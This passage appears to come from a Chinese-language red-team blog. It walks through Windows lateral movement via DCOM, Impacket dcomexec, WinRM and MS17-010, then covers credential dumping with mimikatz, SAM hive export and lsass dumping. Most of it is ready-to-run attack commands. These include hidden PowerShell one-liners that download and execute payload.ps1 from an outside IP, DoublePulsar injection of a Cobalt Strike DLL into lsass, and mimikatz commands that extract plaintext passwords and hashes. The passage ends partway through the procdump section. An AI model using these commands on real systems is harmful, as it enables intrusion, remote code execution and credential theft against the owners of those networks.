class="hljs-variable">$com</span> =<span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromprogID</span>(<span class="hljs-string">&quot;Excel.Application&quot;</span>,<span class="hljs-string">&quot;192.168.41.147&quot;</span>))<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.DisplayAlerts</span> = <span class="hljs-variable">$false</span><br><span class="hljs-variable">$com</span> =<span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromprogID</span>(<span class="hljs-string">&quot;Excel.Application&quot;</span>,<span class="hljs-string">&quot;127.0.0.1&quot;</span>))<br></code></pre></td></tr></table></figure><p>2、然后执行如下命令，我们就可以调用该对象的”DDEInitiate”方法在远程主机上启动进程</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span><span class="hljs-selector-class">.DDEInitiate</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c 参数&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="Visio-Application远程执行命令"><a href="#Visio-Application远程执行命令" class="headerlink" title="Visio.Application远程执行命令"></a>Visio.Application远程执行命令</h3><p>目标主机中安装有Visio</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromProgID</span>(<span class="hljs-string">&quot;Visio.Application&quot;</span>,<span class="hljs-string">&quot;192.168.52.138&quot;</span>)).<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.shellExecute</span>(<span class="hljs-string">&quot;C:shell.exe&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="Outlook-Application远程执行命令"><a href="#Outlook-Application远程执行命令" class="headerlink" title="Outlook.Application远程执行命令"></a>Outlook.Application远程执行命令</h3><p>目标主机中安装有Outlook</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromProgID</span>(<span class="hljs-string">&quot;Outlook.Application&quot;</span>,<span class="hljs-string">&quot;192.168.52.138&quot;</span>))<span class="hljs-selector-class">.createObject</span>(<span class="hljs-string">&quot;Shell.Application&quot;</span>)<span class="hljs-selector-class">.shellExecute</span>(<span class="hljs-string">&quot;C:shell.exe&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="Impacket-中的dcomexec-py"><a href="#Impacket-中的dcomexec-py" class="headerlink" title="Impacket 中的dcomexec.py"></a>Impacket 中的dcomexec.py</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dcomexec<span class="hljs-selector-class">.exe</span> <span class="hljs-selector-attr">[domain/]</span>username:password@ip <span class="hljs-comment">//创建一个交互式shell</span><br>dcomexec<span class="hljs-selector-class">.exe</span> <span class="hljs-selector-attr">[domain/]</span>username:password@ip command <span class="hljs-comment">// 执行命令</span><br>dcomexec<span class="hljs-selector-class">.exe</span> administrator:Admin123@<span class="hljs-number">10.210</span>.<span class="hljs-number">100.12</span> hostname<br>dcomexec<span class="hljs-selector-class">.exe</span> administrator:Admin123@<span class="hljs-number">10.210</span>.<span class="hljs-number">100.12</span> cmd<span class="hljs-selector-class">.exe</span> /c <span class="hljs-string">&quot;powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http://49.234.20.184:8989/payload.ps1&#x27;))&quot;</span><br>dcomexec<span class="hljs-selector-class">.exe</span> <span class="hljs-selector-attr">[domain/]</span>username:@ip -hashes <span class="hljs-selector-attr">[hash]</span> <span class="hljs-comment">//hash传递</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024110800584.png" alt="image-20231024110800584"> </p><p><img src="/img/image-20231024111032185.png" alt="image-20231024111032185"></p><p><img src="/img/image-20231024111014630.png" alt="image-20231024111014630"></p><h2 id="16-WinRM远程执行命令横向移动"><a href="#16-WinRM远程执行命令横向移动" class="headerlink" title="16.WinRM远程执行命令横向移动"></a>16.WinRM远程执行命令横向移动</h2><h3 id="WinRM介绍"><a href="#WinRM介绍" class="headerlink" title="WinRM介绍"></a>WinRM介绍</h3><p>WinRM（Windows远程管理）是Microsoft 在Windows中对WS-Management的实现，它使系统可以跨通用网络访问或交换管理信息。利用脚本对象或内置的命令行工具，WinRM可以与可能具有基板管理控制器（BMC）的任何远程计算机一起使用，以获取数据。也可以获取基于Windows的计算机（包括WinRM）。 WinRM默认端口5985（HTTP端口）或5986（HTTPS端口），若配置了WINRM远程服务，当我们拿到一个管理员账户时，可以使用远程连接进行命令执行操作</p><p>winrm通过HTTP（5985）或HTTPS SOAP（5986）端口来进行通信</p><p><img src="/img/image-20231024111937188.png" alt="image-20231024111937188"></p><h3 id="winrs-exe"><a href="#winrs-exe" class="headerlink" title="winrs.exe"></a>winrs.exe</h3><p>Winrs.exe 是一个内置的命令行工具,它允许远程命令的执行在WinRm的适当的有资格的用户</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">winrs -r:http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">5985</span> -u:administrator -p:Admin@<span class="hljs-number">123</span> <span class="hljs-string">&quot;whoami&quot;</span><br>winrs -r:http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">5985</span> -u:机器名\用户名 -p:xxxxx <span class="hljs-string">&quot;ipconfig&quot;</span><br>winrs -r:https:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">5985</span> -u:机器名\用户名 -p:xxxxx <span class="hljs-string">&quot;ipconfig&quot;</span><br>winrs -r:http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">5985</span> -u:机器名\用户名 -p:xxxxx cmd<br>winrs -r:https:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">5985</span> -u:机器名\用户名 -p:xxxxx cmd<br>Invoke-Command -ComputerName TARGET -ScriptBlock &#123; dir c:\ &#125;<br>Invoke-Command -ComputerName TARGET -Credential 域名\用户名 -command &#123;Get-Culture&#125;<br>Invoke-Command -ComputerName TARGET -Credential 域名\用户名 -ScriptBlock &#123;Get-Culture&#125;<br></code></pre></td></tr></table></figure><p>1、执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">winrs -r:http:<span class="hljs-regexp">//</span><span class="hljs-number">10.210</span>.<span class="hljs-number">100.12</span>:<span class="hljs-number">5985</span> -u:administrator -p:Admin123 <span class="hljs-string">&quot;whoami&quot;</span><br>远程上线：<br>winrs -r:http:<span class="hljs-regexp">//</span><span class="hljs-number">10.210</span>.<span class="hljs-number">100.12</span>:<span class="hljs-number">5985</span> -u:administrator -p:Admin123 cmd.exe <span class="hljs-regexp">/c &quot;powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http:/</span><span class="hljs-regexp">/49.234.20.184:8989/</span>payload.ps1<span class="hljs-string">&#x27;))&quot;</span><br></code></pre></td></tr></table></figure><p>提示:如果出现</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Winrs</span> <span class="hljs-literal">error</span>:WinRM 客户端无法处理该请求。 可以在下列条件下将默认身份验证与 IP 地址结合使用:<br>传输为 HTTPS 或目标位于 TrustedHosts 列表中，并且提供了显式凭据。 使用 winrm.cmd 配置<br>TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 有关如何设置<br>TrustedHosts 的详细信息，请运行以下命令<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024113016297.png" alt="image-20231024113016297"></p><p>输入出现 切换到cmd输入 </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">winrm <span class="hljs-built_in">set</span> winrm/config<span class="hljs-built_in">/Client </span>@&#123;<span class="hljs-attribute">TrustedHosts</span>=<span class="hljs-string">&quot;*&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024112641757.png" alt="image-20231024112641757"></p><h2 id="17-使用系统漏洞ms17010横向移动"><a href="#17-使用系统漏洞ms17010横向移动" class="headerlink" title="17.使用系统漏洞ms17010横向移动"></a>17.使用系统漏洞ms17010横向移动</h2><h3 id="Cobalt-Strike-生成DLL"><a href="#Cobalt-Strike-生成DLL" class="headerlink" title="Cobalt Strike 生成DLL"></a>Cobalt Strike 生成DLL</h3><p>1、生成 CS的生成 bin文件</p><p><img src="/img/image-20231024114635209.png" alt="image-20231024114635209"> </p><p>2、使用msf 用 bin文件生成 dll文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">msfvenom -<span class="hljs-selector-tag">p</span> generic/custom PAYLOADFILE=./payload<span class="hljs-selector-class">.bin</span> -<span class="hljs-selector-tag">a</span> x64 <span class="hljs-attr">--platform</span> windows -f dll -o <span class="hljs-number">123</span>.dll<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024114714201.png" alt="image-20231024114714201"></p><p>3、或者直接使用cs生成</p><p><img src="/img/image-20231024114738887.png" alt="image-20231024114738887"> </p><h3 id="原版ms17-010渗透"><a href="#原版ms17-010渗透" class="headerlink" title="原版ms17-010渗透"></a>原版ms17-010渗透</h3><p>1、上传ms17-010工具 CS执行下面的命令 （目标似乎只能打win7）</p><p>植入后门</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Eternalblue-<span class="hljs-number">2.2</span>.<span class="hljs-number">0</span><span class="hljs-selector-class">.exe</span> <span class="hljs-attr">--TargetIp</span> <span class="hljs-number">10.210</span>.<span class="hljs-number">100</span><span class="hljs-selector-class">.xx</span> <span class="hljs-attr">--Target</span> WIN72K8R2 <span class="hljs-attr">--DaveProxyPort</span>=<span class="hljs-number">0</span> <span class="hljs-attr">--NetworkTimeout</span> <span class="hljs-number">60</span> <span class="hljs-attr">--TargetPort</span> <span class="hljs-number">445</span> <span class="hljs-attr">--VerifyTarget</span> True <span class="hljs-attr">--VerifyBackdoor</span> True <span class="hljs-attr">--MaxExploitAttempts</span> <span class="hljs-number">3</span> <span class="hljs-attr">--GroomAllocations</span> <span class="hljs-number">12</span> <span class="hljs-attr">--OutConfig</span> outlog.txt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024114403436.png" alt="image-20231024114403436"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Doublepulsar-<span class="hljs-number">1.3</span>.<span class="hljs-number">1</span><span class="hljs-selector-class">.exe</span> <span class="hljs-attr">--InConfig</span> Doublepulsar-<span class="hljs-number">1.3</span>.<span class="hljs-number">1</span><span class="hljs-selector-class">.xml</span> <span class="hljs-attr">--TargetIp</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">41.168</span> <span class="hljs-attr">--TargetPort</span> <span class="hljs-number">445</span> <span class="hljs-attr">--Protocol</span> SMB <span class="hljs-attr">--Architecture</span> x64 <span class="hljs-attr">--Function</span> RunDLL <span class="hljs-attr">--DllPayload</span> <span class="hljs-number">123</span><span class="hljs-selector-class">.dll</span> <span class="hljs-attr">--payloadDllOrdinal</span> <span class="hljs-number">1</span> <span class="hljs-attr">--ProcessName</span> lsass<span class="hljs-selector-class">.exe</span> <span class="hljs-attr">--ProcessCommandLine</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">--NetworkTimeout</span> <span class="hljs-number">60</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231103121000097.png" alt="image-20231103121000097"></p>]]></content>
    
    
    <categories>
      
      <category>后渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网-Windows密码抓取</title>
    <link href="/2023/11/03/%E5%86%85%E7%BD%91-Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
    <url>/2023/11/03/%E5%86%85%E7%BD%91-Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h1 id="windows密码抓取"><a href="#windows密码抓取" class="headerlink" title="windows密码抓取"></a>windows密码抓取</h1><h2 id="1-Mimikatz介绍"><a href="#1-Mimikatz介绍" class="headerlink" title="1.Mimikatz介绍"></a>1.Mimikatz介绍</h2><h3 id="Mimikatz介绍"><a href="#Mimikatz介绍" class="headerlink" title="Mimikatz介绍"></a>Mimikatz介绍</h3><p>Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，但由于其功能强大，能够直接读取 WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具，mimikatz可以从内存中提取明文密码、哈希、PIN 码和 kerberos 票证。 mimikatz 还可以执行哈希传递、票证传递或构建黄金票证 </p><p>项目地址 <a href="https://github.com/gentilkiwi/mimikatz/">https://github.com/gentilkiwi/mimikatz/</a></p><p>模块命令如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">cls： 清屏<br>standard： 标准模块，基本命令<br>crypto： 加密相关模块<br>sekurlsa： 与证书相关的模块<br>kerberos： kerberos模块<br>privilege： 提权相关模块<br>process： 进程相关模块<br>serivce： 服务相关模块<br>lsadump： LsaDump模块<br>ts： 终端服务器模块<br>event： 事件模块<br>misc： 杂项模块<br>token： 令牌操作模块<br>vault： Windows 、证书模块<br>minesweeper：Mine Sweeper模块<br>net：<br>dpapi： DPAPI模块（通过API或RAW访问）[数据保护应用程序编程接口]<br>busylight： BusyLight Module<br>sysenv： 系统环境值模块<br>sid： 安全标识符模块<br>iis： IIS XML配置模块<br>rpc： mimikatz的RPC控制<br>sr98： 用于SR98设备和T5577目标的RF模块<br>rdm： RDM（<span class="hljs-number">830</span>AL）器件的射频模块<br>acr： ACR模块<br>version： 查看版本<br><span class="hljs-keyword">exit</span>： 退出<br></code></pre></td></tr></table></figure><p>常用命令</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs arduino">CRYPTO::Certificates – 列出/导出凭证。<br>KERBEROS::Golden – 创建黄金票证/白银票证/信任票证。<br>KERBEROS::List – 列出在用户的内存中所有用户的票证（TGT 和 TGS）。<br>KERBEROS::PTT – 票证传递。<br>LSADUMP::DCSync – 向 DC 发起同步一个对象（获取帐户的密码数据）的质询。<br>LSADUMP::LSA – 向 LSA <span class="hljs-built_in">Server</span> 质询检索 SAM/AD 的数据（正常或未打补丁的情况下）。可以从 DC 或者是一个<br>接下来看几个常用的模块<br>sekurlsa模块<br>process模块<br>lsass.dmp的转储文件中<br>导出所有的Active Directory 域凭证数据。同样也可以获取指定帐户的凭证，如 krbtgt 帐户，使用 /name 参数，<br>如：“/name:krbtgt”。<br>LSADUMP::SAM ‐ 获取 SysKey 来解密 SAM 的项目数据（从注册表或者 hive 中导出）SAM 选项。可以连接到本地安<br>全帐户管理器（SAM）<br>数据库中并能转储本地帐户的凭证。可以用来转储在 Windows 计算机上的所有的本地凭据。<br>LSADUMP::Trust ‐ 向 LSA <span class="hljs-built_in">Server</span> 质询来获取信任的认证信息（正常或未打补丁的情况下）为所有相关的受信的域或<br>林转储信任密钥（密码）<br>MISC::AddSid – 将用户帐户添加到 SID 历史记录。第一个值是目标帐户，第二值是帐户/组名（可以是多个或 SID<br>）。<br>MISC::MemSSP – 注入恶意的 Wndows SSP 来记录本地身份验证凭据。<br>MISC::Skeleton – 在 DC 中注入万能钥匙（Skeleton Key） 到 LSASS 进程中。这使得所有用户所。<br>使用的万能钥匙修补 DC 使用 “主密码” （又名万能钥匙）以及他们自己通常使用的密码进行身份验证。<br>PRIVILEGE::Debug – 获得 Debug 权限（很多 Mimikatz 命令需要 Debug 权限或本地 SYSTEM 权限）。<br>SEKURLSA::Ekeys – 列出 Kerberos 密钥<br>SEKURLSA::Kerberos – 列出所有已通过认证的用户的 Kerberos 凭证（包括服务帐户和计算机帐户）。<br>SEKURLSA::Krbtgt – 获取域中 Kerberos 服务帐户（KRBTGT）的密码数据。<br>SEKURLSA::LogonPasswords – 列出所有可用的提供者的凭据。这个命令通常会显示最近登录过的用户和最近登录过的<br>计算机的凭证。<br>SEKURLSA::Pth – Hash 传递 和 Key 传递（注：Over‐Pass‐the‐Hash 的实际过程就是传递了相关的 <span class="hljs-built_in">Key</span>(s)）。<br>SEKURLSA::Tickets – 列出最近所有已经过身份验证的用户的可用的 Kerberos 票证，包括使用用户帐户的上下文运<br>行的服务和本地计算机<br>在AD 中的计算机帐户。与 kerberos::list 不同的是 sekurlsa 使用内存读取的方式，它不会受到密钥导出的限制。<br>TOKEN::List – 列出系统中的所有令牌。<br>TOKEN::Elevate – 假冒令牌。用于提升权限至 SYSTEM 权限（默认情况下）或者是发现计算机中的域管理员的令牌。<br>TOKEN::Elevate /domainadmin – 假冒一个拥有域管理员凭证的令牌<br></code></pre></td></tr></table></figure><p>几个常用的模块 </p><p>sekurlsa模块</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nsis">privilege模块<br><span class="hljs-title function_">privilege::debug</span> 提升为debug权限<br>sekurlsa：模块，从lsass进程中提取passwords、keys、pin、tickets等信息<br><span class="hljs-title function_">sekurlsa::msv</span> 获取HASH (LM,NTLM)<br><span class="hljs-title function_">sekurlsa::wdigest</span> 通过可逆的方式去内存中读取明文密码<br><span class="hljs-title function_">sekurlsa::Kerberos</span> 假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码<br><span class="hljs-title function_">sekurlsa::tspkg</span> 通过tspkg读取明文密码<br><span class="hljs-title function_">sekurlsa::livessp</span> 通过livessp 读取明文密码<br><span class="hljs-title function_">sekurlsa::ssp</span> 通过ssp 读取明文密码<br><span class="hljs-title function_">sekurlsa::logonPasswords</span> 通过以上各种方法读取明文密码<br><span class="hljs-title function_">sekurlsa::process</span> 将自己的进程切换到lsass进程中，之前只是注入读取信息<br><span class="hljs-title function_">sekurlsa::minidump</span> <span class="hljs-keyword">file</span> 这个模块可以读取已经打包的内存信息<br><span class="hljs-title function_">sekurlsa::pth</span> 哈希传递<br><span class="hljs-title function_">sekurlsa::pth</span> /<span class="hljs-literal">user</span>:administrator/domain:host1 /ntlm:cdf34cda4e455232323xxxx<br><span class="hljs-title function_">sekurlsa::pth</span> /<span class="hljs-literal">user</span>:administrator/domain:host1 /aes256:cdf34cda4e455232323xxxx<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cs上：mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords&quot;</span> <span class="hljs-keyword">exit</span> &gt; <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010210729894.png" alt="image-20231010210729894"></p><p>process模块</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino">process::list 列出进程列表<br>process::exports 导出进程列表<br>process::imports 导入列表<br>process::start 开始一个进程<br>process::stop 停止一个程序<br>process::suspend 冻结一个进程<br>process::resume 从冻结中恢复<br>process::run notepad 运行一个程序<br>process::runp 以SYSTEM系统权限打开一个新的mimikatz窗口<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010210718999.png" alt="image-20231010210718999"></p><p>小tip：执行process::runp 以SYSTEM系统权限打开一个新的mimikatz窗口，然后在这个窗口中执行cs木马，提升权限到system</p><p><img src="/img/image-20231010211354962.png" alt="image-20231010211354962"></p><p><img src="/img/image-20231010211404953.png" alt="image-20231010211404953"></p><p>kerberos模块</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::list 列出系统中的票据<br>kerberos::tgt 清除系统中的票据<br>kerberos::purge 导入票据到系统中<br>kerberos::ptc 票据路径<br></code></pre></td></tr></table></figure><p>lsadump模块</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nsis">(域控上执行)查看域kevin.com内指定用户root的详细信息，包括NTLM哈希等<br><span class="hljs-title function_">lsadump::dcsync</span> /domain:kevin.com /<span class="hljs-literal">user</span>:root<br>(在域控上执行)读取所有域用户的哈希<br><span class="hljs-title function_">lsadump::lsa</span> /patch<br>从sam.hive和<span class="hljs-params">system</span>.hive文件中获得NTLM Hash<br><span class="hljs-title function_">lsadump::sam</span> /sam:sam.hive /<span class="hljs-params">system</span>:<span class="hljs-params">system</span>.hive<br>从本地SAM文件中读取密码哈希<br><span class="hljs-title function_">token::elevate</span><br><span class="hljs-title function_">lsadump::sam</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010212015418.png" alt="image-20231010212015418"></p><h2 id="2-离线读取SAM文件获取密码"><a href="#2-离线读取SAM文件获取密码" class="headerlink" title="2.离线读取SAM文件获取密码"></a>2.离线读取SAM文件获取密码</h2><h3 id="导出sam和system文件"><a href="#导出sam和system文件" class="headerlink" title="导出sam和system文件"></a>导出sam和system文件</h3><p>1、通多reg命令无工具导出(注册表中)</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">reg <span class="hljs-built_in">save</span> hklm\sam sam.hive<br>reg <span class="hljs-built_in">save</span> hklm\<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.hive<br></code></pre></td></tr></table></figure><img src="/img/image-20231010212243539.png" alt="image-20231010212243539" style="zoom:80%;" /><img src="/img/image-20231010212511489.png" alt="image-20231010212511489" style="zoom:80%;" /><p>通过cs下载到cs服务器机器上：</p><p><img src="/img/image-20231010212638437.png" alt="image-20231010212638437"></p><p>2、通过nishang中的Copy-VSS进行复制，如果这个脚本运行在了DC服务器上，ntds.dit 和 SYSTEM hive也能被拷贝出来</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">copy</span>‐vss <span class="hljs-comment">//直接将文件保存在当前目录下</span><br><span class="hljs-keyword">copy</span>‐vss ‐<span class="hljs-keyword">DestinationDir</span> 路径 <span class="hljs-comment">//指定保存文件的路径（必须是已经存在的路径）</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010213631635.png" alt="image-20231010213631635"></p><h3 id="读取sam和system文件获取密码"><a href="#读取sam和system文件获取密码" class="headerlink" title="读取sam和system文件获取密码"></a>读取sam和system文件获取密码</h3><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-title function_">lsadump::sam</span> /sam:sam.hive /<span class="hljs-params">system</span>:<span class="hljs-params">system</span>.hive<br></code></pre></td></tr></table></figure><img src="/img/image-20231010213308844.png" alt="image-20231010213308844" style="zoom: 67%;" /><h2 id="3-mimikatz在线读取sam和lsass获取密码"><a href="#3-mimikatz在线读取sam和lsass获取密码" class="headerlink" title="3.mimikatz在线读取sam和lsass获取密码"></a>3.mimikatz在线读取sam和lsass获取密码</h2><h3 id="在线读取sam文件"><a href="#在线读取sam文件" class="headerlink" title="在线读取sam文件"></a>在线读取sam文件</h3><p>使用mimikatz在线读取sam文件</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">分开的命令如下<br><span class="hljs-symbol">privilege:</span>:debug<br><span class="hljs-symbol">token:</span>elevate<br><span class="hljs-symbol">lsadump:</span>:sam<br>连起来<br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;lsadump::sam&quot;</span><br></code></pre></td></tr></table></figure><p>注意：在cs中执行加上exit   否则可能死循环</p><p><img src="/img/image-20231011101631775.png" alt="image-20231011101631775"></p><h3 id="在线读取lsass进程"><a href="#在线读取lsass进程" class="headerlink" title="在线读取lsass进程"></a>在线读取lsass进程</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::msv 获取<span class="hljs-built_in">HASH</span> (LM,NTLM)<br>sekurlsa::wdigest 通过可逆的方式去内存中读取明文密码<br>sekurlsa::Kerberos 假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码<br>sekurlsa::tspkg 通过tspkg读取明文密码<br>sekurlsa::livessp 通过livessp 读取明文密码<br>sekurlsa::ssp 通过ssp 读取明文密码<br>sekurlsa::logonPasswords 通过以上各种方法读取明文密码<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231011102251006.png" alt="image-20231011102251006"></p><h2 id="4-mimikatz离线读取lsass进程获取密码（重点）"><a href="#4-mimikatz离线读取lsass进程获取密码（重点）" class="headerlink" title="4.mimikatz离线读取lsass进程获取密码（重点）"></a>4.mimikatz离线读取lsass进程获取密码（重点）</h2><p>参考：<a href="https://blog.csdn.net/weixin_42136837/article/details/112616369">https://blog.csdn.net/weixin_42136837/article/details/112616369</a></p><h3 id="导出lsass文件方式"><a href="#导出lsass文件方式" class="headerlink" title="导出lsass文件方式"></a>导出lsass文件方式</h3><p>1、使用任务管理器导出（windows NT 6）</p><p>前提：已经拿到3389远程桌面</p><p><img src="/img/image-20231011103136617.png" alt="image-20231011103136617"></p><p><img src="/img/image-20231011103157463.png" alt="image-20231011103157463"></p><p>2、使用procdump 导出lsass.dmp文件 ProcDump 是一个<strong>命令行实用工具</strong>，其主要用途是在管理员或开发人员可用于确定峰值原因的峰值期间监视 CPU 峰值和生成故障转储的应用程序。 ProcDump 还包括使用窗口挂起 (使用相同的窗口挂起定义，Windows任务管 理器使用) 、未经处理的异常监视，并且可以根据系统性能计数器的值生成转储。 